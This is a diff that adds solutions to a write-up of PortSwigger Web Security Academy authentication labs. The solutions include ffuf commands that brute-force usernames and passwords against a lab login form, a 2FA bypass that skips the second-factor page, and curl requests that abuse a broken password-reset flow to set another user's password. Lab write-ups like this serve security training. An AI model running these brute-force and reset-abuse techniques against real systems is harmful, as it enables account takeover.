@@ -1266,13 +1266,41 @@ Solution (3rd party tool used: https://github.com/vi/websocat):
 
     https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
 
+Solution:
+
+```
+ffuf -t 10 -x http://127.0.0.1:8080 -X POST -H 'session:S1mBZqhhKbWEuSF9zb9hwAm0YMhcz7T3' -w users.txt -u https://0adb00360441e61fc0fe135e00bc003a.web-security-academy.net/login -d "username=FUZZ&password=xyz" -fr 'Invalid'
+
+ffuf -t 10 -x http://127.0.0.1:8080 -X POST -H 'session:S1mBZqhhKbWEuSF9zb9hwAm0YMhcz7T3' -w passwd.txt -u https://0adb00360441e61fc0fe135e00bc003a.web-security-academy.net/login -d "username=applications&password=FUZZ" -fr 'Incorrect'
+
+curl -L -H 'session:S1mBZqhhKbWEuSF9zb9hwAm0YMhcz7T3' 'https://0adb00360441e61fc0fe135e00bc003a.web-security-academy.net/login' -d "username=applications&password=pepper"
+```
+
 ### Lab: 2FA simple bypass
 
     https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
 
+Solution:
+
+```
+1. Provide carlos credentials
+2. Modify redirect: instead of `/login2` go directly to `/my-account`
+```
+
 ### Lab: Password reset broken logic
 
     https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
+
+Solution:
+
+```
+# request reset password link for wiener:
+curl https://0a0c0010038cef70c08939bb006600a1.web-security-academy.net/forgot-password -d "username=wiener"
+
+# set new password for carlos:
+curl -L -k -x 127.0.0.1:8080 --cookie 'session=jhDhbpkpWYLfS9HVTLGS6pDBh6PydHYo' https://0a0c0010038cef70c08939bb006600a1.web-security-academy.net/forgot-password?temp-forgot-password-token=W7J5AbLFD67g5Zrie4vKE9DiyVLUhrnH -d 'temp-forgot-password-token=6KksLbqie6NBvAVcyCPmJr9Qrxskgxzr
+&username=carlos&new-password-1=abc&new-password-2=abc'
+```
 
 ## Clickjacking
 
